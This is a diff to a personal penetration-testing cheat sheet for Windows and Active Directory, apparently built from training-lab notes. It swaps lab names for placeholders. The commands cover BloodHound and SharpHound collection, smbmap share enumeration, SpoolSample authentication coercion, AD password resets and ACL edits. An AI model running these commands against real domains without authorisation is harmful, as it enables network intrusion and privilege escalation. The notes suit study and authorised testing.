@@ -266,6 +266,11 @@ PS> Get-WmiObject Win32_UserAccount | Select-Object Name, SID
 PS> Get-WmiObject Win32_Group | Select-Object Name, SID
 # privilege check
 PS> whoami /priv
+# check ACL
+PS> $sharedFolderPath = 'C:\Users\TestUser\TestShareFolder';
+PS> icacls $sharedFolderPath /inheritance:r
+PS> $securityGroupName = 'TestGroup'
+PS> icacls $sharedFolderPath /grant "${securityGroupName}:(OI)(CI)M", "${securityGroupName}:(OI)(CI)RX", "${securityGroupName}:(OI)(CI)R", "${securityGroupName}:(OI)(CI)W"
 # Service
 PS> Get-Service
 PS> Get-Service | ? {$_.DisplayName -like "*Hoge*"}
@@ -307,6 +312,9 @@ PS> Get-ADGroup -Identity "Enterprise Admins" -Properties * | Out-String | Selec
 # Change Password
 PS> $Password = ConvertTo-SecureString "NewTestPassword" -AsPlainText -Force
 PS> Set-ADAccountPassword -Identity "TargetUser" -Reset -NewPassword $Password
+# Active Directory Object
+PS> $ChangeDate = New-Object DateTime(2024, 01, 24, 12, 00, 00)
+PS> Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server HOGE.com
 ```
 
 ## sc.exe
@@ -412,20 +420,6 @@ Get-ExecutionPolicy -List
 
 
 icacls .\"Company Data"
-New-SmbShare -Path .\ -Name "Company Data"
-
-New-SmbShare -Path C:\Users\htb-student\"Company Data" -Name "Company Data" -FullAccess 'Everyone'
-
-##
-# Specify the path for the new shared folder
-$sharedFolderPath = 'C:\Users\htb-student\Company Data'
-
-# Specify the name for the new shared folder
-$shareName = 'YourShareName'
-
-# Create a new shared folder
-New-SmbShare -Path $sharedFolderPath -Name $shareName -ReadAccess 'Everyone'
-
 
 
 # Create a new local user
@@ -463,11 +457,6 @@ I apologize for the confusion. The Add-SmbShareAccess cmdlet is available on Win
 
 net share $shareName=$sharedFolderPath "/grant:$securityGroupName,change"
 
-# Disable inheritance before setting specific NTFS permissions
-icacls $sharedFolderPath /inheritance:r
-
-# Set NTFS permissions using icacls
-icacls $sharedFolderPath /grant "${securityGroupName}:(OI)(CI)M", "${securityGroupName}:(OI)(CI)RX", "${securityGroupName}:(OI)(CI)R", "${securityGroupName}:(OI)(CI)W"
 
 
 ## next
@@ -526,6 +515,10 @@ PS> BloodHound.exe
 PS> .\SharpHound.exe -c All --zipfilename hoge
 PS> .\SharpHound.exe --CollectionMethods All --Domain HOGE.com --ExcludeDCs
 ```
+## BloodHound.py
+```zsh
+$ sudo bloodhound-python -u 'TestService' -p 'TestServicePasssord' -ns 172.16.5.6 -d hoge.com -c all
+```
 
 # Snaffer  
 tag: scan
@@ -572,8 +565,6 @@ SMB share enumeration across a domain. |
 $ smbmap -u hoge_user -p hoge_password -d HOGE.LOCAL -H XXX.XXX.XXX.XXX
 ```
 
-sudo bloodhound-python -u 'SAPService' -p 'SapperFi2' -ns 172.16.5.5 -d inlanefreight.local -c all
-
 # setspn
 https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)
 ```powershell
@@ -617,13 +608,9 @@ $ ls inlanefreight_hashes*
 ```
 
 # SpoolSample.exe
-SpoolSample.exe THMSERVER2.za.tryhackme.loc "10.200.83.201"
-
-
-
-$ $ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
-$ Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com
-
+```powershell
+PS> SpoolSample.exe TestHost.HOGE.com "192.168.0.11"
+```
 
 # LDAP Pass-back Attacks
 ```zsh
